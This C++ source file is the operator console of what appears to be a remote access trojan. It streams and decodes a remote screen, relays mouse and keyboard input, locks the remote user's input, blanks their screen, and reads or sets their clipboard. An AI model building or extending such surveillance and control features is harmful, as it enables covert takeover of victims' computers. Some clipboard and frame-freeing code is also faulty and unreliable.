// ScreenSpyDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "imm.h"
#include "H264ScreenSpyDlg.h"

#pragma comment(lib, "Imm32.lib")





#ifdef _DEBUG
#define new DEBUG_NEW
#endif



/////////////////////////////////////////////////////////////////////////////
// H264CScreenSpyDlg dialog

enum
{
	IDM_CONTROL = 0x0010,	// 控制屏幕
	IDM_TOPMOST,			// 屏幕窗口置顶
	IDM_TRACE_CURSOR,		// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,		// 锁定远程计算机输入
	IDM_BLANK_SCREEN,		// 黑屏
	IDM_SAVEDIB,			// 保存图片
	IDM_GET_CLIPBOARD,		// 获取剪贴板
	IDM_SET_CLIPBOARD,		// 设置剪贴板

};

HINSTANCE 	handle_avcode;
HINSTANCE  handle_acutil;


H264CScreenSpyDlg::H264CScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(H264CScreenSpyDlg::IDD, pParent)
{
	TCHAR strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
	CString str_path = strSelf;
	str_path = str_path.Mid(0, str_path.ReverseFind('\\'));

	CString  str_avcode, str_avutil;
	str_avcode = str_path + _T("\\avcodec-57.dll");
	str_avutil = str_path + _T("\\avutil-55.dll");

	handle_avcode = ::LoadLibrary(str_avcode);
	if (handle_avcode != NULL)
	{
		MYavcodec_register_all = (fnavcodec_register_all)GetProcAddress(handle_avcode, "avcodec_register_all");
		MYavcodec_find_decoder = (fnavcodec_find_decoder)GetProcAddress(handle_avcode, "avcodec_find_decoder");
		MYavcodec_alloc_context3 = (fnavcodec_alloc_context3)GetProcAddress(handle_avcode, "avcodec_alloc_context3");
		MYavcodec_open2 = (fnavcodec_open2)GetProcAddress(handle_avcode, "avcodec_open2");
		MYav_init_packet = (fnav_init_packet)GetProcAddress(handle_avcode, "av_init_packet");
		MYav_new_packet = (fnav_new_packet)GetProcAddress(handle_avcode, "av_new_packet");
		MYavcodec_send_packet = (fnavcodec_send_packet)GetProcAddress(handle_avcode, "avcodec_send_packet");
		MYav_packet_unref = (fnav_packet_unref)GetProcAddress(handle_avcode, "av_packet_unref");
		MYavcodec_receive_frame = (fnavcodec_receive_frame)GetProcAddress(handle_avcode, "avcodec_receive_frame");
		MYavcodec_close = (fnavcodec_close)GetProcAddress(handle_avcode, "avcodec_close");
		MYavcodec_free_context = (fnavcodec_free_context)GetProcAddress(handle_avcode, "avcodec_free_context");
	}

	handle_acutil = ::LoadLibrary(str_avutil);
	if (handle_acutil != NULL)
	{
		MYav_frame_alloc = (fnav_frame_alloc)GetProcAddress(handle_acutil, "av_frame_alloc");
		MYav_frame_free = (fnav_frame_free)GetProcAddress(handle_acutil, "av_frame_free");
		MYav_frame_unref = (fnav_frame_unref)GetProcAddress(handle_acutil, "av_frame_unref");
	}


	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	icopsocket = m_pContext->m_Socket;
	m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpvLastBits = NULL;

	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SCREENSYP));
	m_IPAddress = m_pContext->szAddress;
	m_bOnClose = FALSE;
	context = NULL;
	//DLLInit
	SDL_Init(SDL_INIT_VIDEO);
	MYavcodec_register_all();

	m_bIsCtrl = false;    // 默认不进行控制
	m_LastCursorIndex = 1;
	m_bIsFullScreen = false;
	m_MYtagMSG = new MYtagMSG;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	m_avi = NULL;
	m_nCount = 0;
	alldata = 0;
	//InitializeCriticalSection(&m_cs);
}

void H264CScreenSpyDlg::OnCancel()
{

	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	context->enableDraw = 0;
	Sleep(400);
	if (m_avi != NULL)
	{
		m_avi->Close();
		delete m_avi;
	}
	StopScreen();
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
	SDL_Quit();
	if (handle_avcode)
	{
		FreeLibrary(handle_avcode);
	}
	if (handle_acutil)
	{
		FreeLibrary(handle_acutil);
	}
	m_bIsCtrl = false;
	ClipCursor(NULL);
	SAFE_DELETE(m_MYtagMSG);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void H264CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(H264CScreenSpyDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(H264CScreenSpyDlg, CDialog)
	//{{AFX_MSG_MAP(H264CScreenSpyDlg)
	ON_WM_NCLBUTTONDBLCLK()
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_SIZE()
	//ON_MESSAGE(WM_MOVING, OnMoving)
	ON_WM_MOVE()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// H264CScreenSpyDlg message handlers

void H264CScreenSpyDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	m_nCount++;
	alldata += m_pContext->m_DeCompressionBuffer.GetBufferLen();
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_H264SCREEN:
		if (context->enableDraw)
			DrawScreen();
		break;
	case TOKEN_h264CLIPBOARD_TEXT:
		UpdateLocalClipboard((char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	case TOKEN_BITMAPINFO_PLAY:  //发生在屏幕大小变化上面
	{
		memcpy(&readpkg, m_pContext->m_DeCompressionBuffer.GetBuffer(1), sizeof(PacketReadyData));
		ResetScreen(true);
	}
	break;
	default:
		// 传输发生异常数据
		return;
	}
}

void H264CScreenSpyDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("H264屏幕监控 \\\\ %s %d * %d 第%d帧  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_IPAddress, readyData.video_w, readyData.video_h, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}


bool H264CScreenSpyDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;
	CClientDC dc(this);
	CRect rc;
	GetClientRect(&rc);
	int iBitPerPixel = dc.GetDeviceCaps(BITSPIXEL);
	int iWidth = rc.Width();
	int iHeight = rc.Height();
	CDC memDC;
	memDC.CreateCompatibleDC(&dc);
	CBitmap memBitmap, * oldBitmap;
	memBitmap.CreateCompatibleBitmap(&dc, iWidth, iHeight);
	oldBitmap = memDC.SelectObject(&memBitmap);
	memDC.BitBlt(0, 0, iWidth, iHeight, &dc, 0, 0, SRCCOPY);
	BITMAP bmp;
	memBitmap.GetBitmap(&bmp);
	CStringA PathNameA;
	PathNameA = dlg.GetPathName();
	FILE* fp;
	fopen_s(&fp, PathNameA, "wb");
	BITMAPINFOHEADER bih;
	memset(&bih, 0, sizeof(bih));
	bih.biBitCount = bmp.bmBitsPixel;
	bih.biCompression = BI_RGB;//表示不压缩
	bih.biHeight = bmp.bmHeight;
	bih.biPlanes = 1;//位平面数，必须为1
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biSizeImage = bmp.bmWidthBytes * bmp.bmHeight;
	bih.biWidth = bmp.bmWidth;
	BITMAPFILEHEADER bfh;
	memset(&bfh, 0, sizeof(bfh));
	bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	bfh.bfSize = bfh.bfOffBits + bmp.bmWidthBytes * bmp.bmHeight;
	bfh.bfType = (WORD)0x4d42;//必须表示"BM"

	fwrite(&bfh, 1, sizeof(BITMAPFILEHEADER), fp);
	fwrite(&bih, 1, sizeof(bih), fp);

	byte* p = new byte[bmp.bmWidthBytes * bmp.bmHeight];
	GetDIBits(memDC.m_hDC, (HBITMAP)memBitmap.m_hObject, 0, iHeight, p, (LPBITMAPINFO)&bih, DIB_RGB_COLORS);
	fwrite(p, 1, bmp.bmWidthBytes * bmp.bmHeight, fp);
	delete[] p;

	fclose(fp);

	memDC.SelectObject(oldBitmap);

	return true;
}




BOOL H264CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	// when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	pSysMenu->AppendMenu(MF_SEPARATOR);
	pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&C)"));
	pSysMenu->AppendMenu(MF_STRING, IDM_TOPMOST, _T("屏幕窗口置顶(&T)"));
	pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("跟踪服务端鼠标(&F)"));
	pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("锁定服务端鼠标和键盘(&O)"));
	pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("服务端黑屏(&B)"));
	pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
	pSysMenu->AppendMenu(MF_SEPARATOR);
	pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&G)"));
	pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&P)"));
	pSysMenu->AppendMenu(MF_SEPARATOR);
	::ImmAssociateContext(m_hWnd, NULL);
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);

	m_LastCursorPos.x = 0;
	m_LastCursorPos.y = 0;
	m_bIsTraceCursor = false;
	memcpy(&readpkg, m_pContext->m_DeCompressionBuffer.GetBuffer(1), sizeof(PacketReadyData));
	pkghead = readpkg.head;
	readyData = readpkg.data;
	iMonitors = 0;
	//添加屏幕选项 
	CString menutitle;
	for (; iMonitors < (readpkg.i); iMonitors++)
	{
		menutitle.Format(_T("显示器 --%d"), iMonitors + 1);
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD + iMonitors + 1, menutitle);
	}

	//设置最大窗体
	CWnd* pWnd = GetDlgItem(IDC_STATIC);
	if (pWnd->GetSafeHwnd())
		pWnd->MoveWindow(0, 0, readyData.video_w * 4, readyData.video_h * 4);
	GetClientRect(&CLIENTRECT);
	ScreenToClient(CLIENTRECT);
	clienr = CLIENTRECT.right - CLIENTRECT.left;
	clientt = CLIENTRECT.bottom - CLIENTRECT.top;
	m_wZoom = (double)readyData.video_w / (double)clienr;
	m_hZoom = (double)readyData.video_h / (double)clientt;
	ResetScreen(false);

	return TRUE;

}



void H264CScreenSpyDlg::DrawScreen()
{

	pkg_size = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	MYav_init_packet(&packet);
	rn = MYav_new_packet(&packet, pkg_size);


	memcpy(packet.data, m_pContext->m_DeCompressionBuffer.GetBuffer(1), pkg_size);


	//开始解码显示
	rn = MYavcodec_send_packet(context->codecCtx, &packet);
	MYav_packet_unref(&packet);

	while (MYavcodec_receive_frame(context->codecCtx, yuvFrame) == 0) {

		if (context->enableDraw) {
			SDL_UpdateYUVTexture(sdlTexture, NULL, yuvFrame->data[0], yuvFrame->linesize[0],
				yuvFrame->data[1], yuvFrame->linesize[1],
				yuvFrame->data[2], yuvFrame->linesize[2]);

			sdlRect.x = 0;
			sdlRect.y = 0;
			//sdlRect.w = yuvFrame->width;
			//sdlRect.h = yuvFrame->height;
			sdlRect.w = CLIENTRECT.Width();
			sdlRect.h = CLIENTRECT.Height();

			SDL_RenderClear(renderer);
			SDL_RenderCopy(renderer, sdlTexture, NULL, &sdlRect);
			//SDL_RenderCopy(renderer, pTexture, NULL, &sdl_rect_pointer);
			SDL_RenderPresent(renderer);
		}
	}

}


void H264CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
	// TODO: Add your message handler code here
	if (!GetSafeHwnd())
		return;
	GetClientRect(&CLIENTRECT);
	ScreenToClient(CLIENTRECT);
	clienr = CLIENTRECT.right - CLIENTRECT.left;
	clientt = CLIENTRECT.bottom - CLIENTRECT.top;
	m_wZoom = (double)readyData.video_w / (double)clienr;
	m_hZoom = (double)readyData.video_h / (double)clientt;
	CDialog::OnSize(nType, cx, cy);


}

void H264CScreenSpyDlg::StopScreen()
{
	if (context)
	{
		MYavcodec_close(context->codecCtx);
		MYavcodec_free_context(&context->codecCtx);
		MYav_frame_free(&yuvFrame); // 释放
		MYav_frame_unref(yuvFrame); // 释放AVFrame的所有引用，以便重用
		SDL_DestroyRenderer(renderer);
		SDL_DestroyTexture(sdlTexture);
		SDL_DestroyWindow(window);
		delete context;

	}
}



void  H264CScreenSpyDlg::ResetScreen(bool reset)
{
	StopScreen();
	if (reset)
	{
		PacketReadyData readpkg;
		memcpy(&readpkg, m_pContext->m_DeCompressionBuffer.GetBuffer(1), sizeof(PacketReadyData));
		pkghead = readpkg.head;
		readyData = readpkg.data;
		//设置最大窗体
		CWnd* pWnd = GetDlgItem(IDC_STATIC);
		if (pWnd->GetSafeHwnd())
			pWnd->MoveWindow(0, 0, readyData.video_w * 4, readyData.video_h * 4);
		GetClientRect(&(CLIENTRECT));
		ScreenToClient(CLIENTRECT);
		clienr = CLIENTRECT.right - CLIENTRECT.left;
		clientt = CLIENTRECT.bottom - CLIENTRECT.top;
		m_wZoom = (double)readyData.video_w / (double)clienr;
		m_hZoom = (double)readyData.video_h / (double)clientt;
	}

	context = new Context;
	context->hwnd = GetDlgItem(IDC_STATIC)->GetSafeHwnd();// this->m_hWnd;

	context->enableDraw = true;
	int ret = 0;
	context->codec = MYavcodec_find_decoder(28);
	context->codecCtx = MYavcodec_alloc_context3(context->codec);
	ret = MYavcodec_open2(context->codecCtx, context->codec, NULL);
	sdlTexture = NULL;
	sdlRect;
	pkg_size = 0;
	window_w = 0, window_h = 0;
	yuvFrame = MYav_frame_alloc();
	pkghead;
	rn = 0;
	renderer = NULL;
	window = NULL;
	packet;
	on = 1;
	readyData;

	window = SDL_CreateWindowFrom(context->hwnd);
	renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);
	if (!renderer)
	{
		renderer = SDL_CreateRenderer(window, -1, 0);
	}
	sdlTexture = SDL_CreateTexture(renderer, SDL_PIXELFORMAT_IYUV, SDL_TEXTUREACCESS_STREAMING, readyData.video_w, readyData.video_h);
	BYTE	bBuff = COMMAND_NEXT_H264CScreenSpyDlg;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
	return;
}

void H264CScreenSpyDlg::OnPaint()
{
	// TODO: Add your message handler code here
	CPaintDC dc(this); // device context for painting


}






void H264CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{

	int i = nID - IDM_SET_CLIPBOARD;
	if (i > 0 && i < (iMonitors)+1)
	{
		DWORD	dwBytesLength = 1 + sizeof(int);
		LPBYTE	lpBuffer = new BYTE[dwBytesLength];
		lpBuffer[0] = COMMAND_h264_SCREEN_CHANGE_MONITORS;
		memcpy(lpBuffer + 1, &i, dwBytesLength - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, dwBytesLength);
		SAFE_DELETE_AR(lpBuffer);
	}
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{

	case SC_MAXIMIZE:
	{
		OnNcLButtonDblClk(HTCAPTION, NULL);
	}
	return;
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	break;
	case IDM_TOPMOST:
	{
		UINT bIsTopMost = pSysMenu->GetMenuState(IDM_TOPMOST, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_TOPMOST, bIsTopMost ? MF_UNCHECKED : MF_CHECKED);
		if (bIsTopMost)
			SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		else
			SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
	}
	break;
	case IDM_TRACE_CURSOR:   // 跟踪服务端鼠标
	{
		m_bIsTraceCursor = !m_bIsTraceCursor;
		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);

		if (!m_bIsTraceCursor)
		{
			BYTE	bToken;
			bToken = COMMAND_h264_HIDE_Cursor;
			m_iocpServer->Send(m_pContext, &bToken, 1);
		}
		else
		{
			BYTE	bToken;
			bToken = COMMAND_h264_SHOW_Cursor;
			m_iocpServer->Send(m_pContext, &bToken, 1);
		}


	}
	break;
	case IDM_BLOCK_INPUT:    // 锁定服务端鼠标和键盘
	{
		UINT bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_h264_SCREEN_BLOCK_INPUT;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_BLANK_SCREEN:   // 服务端黑屏
	{
		UINT bIsChecked = pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED;
		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
		BYTE	bToken[2];
		bToken[0] = COMMAND_h264_SCREEN_BLANK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;

	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_GET_CLIPBOARD:  // 获取剪贴板
	{
		BYTE	bToken = COMMAND_h264_SCREEN_GET_CLIPBOARD;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SET_CLIPBOARD:  // 设置剪贴板
	{
		SendLocalClipboard();
	}
	break;


	default:
		CDialog::OnSysCommand(nID, lParam);

	}

}



BOOL H264CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
	switch (pMsg->message)
	{
	case WM_MOUSEMOVE:
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEWHEEL:
	{
		if (!m_bIsCtrl) 	return TRUE;
		m_MYtagMSG->message = pMsg->message;
		m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + readpkg.data.video_L);
		m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + readpkg.data.video_T);
		m_MYtagMSG->wParam = pMsg->wParam;
		LPBYTE lpData = new BYTE[m_MYtagMSGsize + 1];
		lpData[0] = COMMAND_h264_SCREEN_CONTROL;
		memcpy(lpData + 1, m_MYtagMSG, m_MYtagMSGsize);
		m_iocpServer->Send(m_pContext, lpData, m_MYtagMSGsize + 1);
		SAFE_DELETE_AR(lpData)

	}
	break;
	case WM_KEYDOWN:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL) & 0x8000 && GetKeyState(VK_MENU) & 0x8000)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			return TRUE;
		}

	case WM_KEYUP:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL) & 0x8000 && GetKeyState(VK_MENU) & 0x8000)
		{
			return TRUE;
		}
	case WM_SYSKEYUP:
	case WM_SYSKEYDOWN:
		if (pMsg->wParam != VK_SCROLL)
		{
			if (!m_bIsCtrl) 	return TRUE;
			m_MYtagMSG->message = pMsg->message;
			m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + readpkg.data.video_L);
			m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + readpkg.data.video_T);
			m_MYtagMSG->wParam = pMsg->wParam;
			LPBYTE lpData = new BYTE[m_MYtagMSGsize + 1];
			lpData[0] = COMMAND_h264_SCREEN_CONTROL;
			memcpy(lpData + 1, m_MYtagMSG, m_MYtagMSGsize);
			m_iocpServer->Send(m_pContext, lpData, m_MYtagMSGsize + 1);
			SAFE_DELETE_AR(lpData)
				if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_F4)
					return TRUE;
		}
		if (pMsg->wParam == VK_SCROLL)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			else ClipCursor(NULL);
		}
		if (pMsg->wParam == VK_SPACE)
		{
			return TRUE;
		}

		break;
	default:
		break;
	}

	return CDialog::PreTranslateMessage(pMsg);
}


void H264CScreenSpyDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	if (!m_bOnClose)
		OnCancel();
	delete this;
	CDialog::PostNcDestroy();
}



void H264CScreenSpyDlg::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void H264CScreenSpyDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_h264_SCREEN_SET_CLIPBOARD;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}


void H264CScreenSpyDlg::OnTimer(UINT nIDEvent)
{

	CDialog::OnTimer(nIDEvent);
}



